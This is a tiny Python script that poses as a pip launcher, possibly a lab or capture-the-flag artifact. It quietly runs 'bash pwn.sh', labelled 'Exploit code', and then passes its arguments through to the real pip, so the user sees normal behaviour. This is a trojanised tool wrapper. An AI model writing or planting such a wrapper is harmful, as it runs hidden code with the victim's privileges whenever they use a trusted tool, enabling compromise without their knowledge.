import os
import sys

# Exploit code
os.system("bash pwn.sh")

# Proxy to real pip
import subprocess
def main():
    subprocess.run([sys.executable, "-m", "pip"] + sys.argv[1:])

if __name__ == "__main__":
    main()
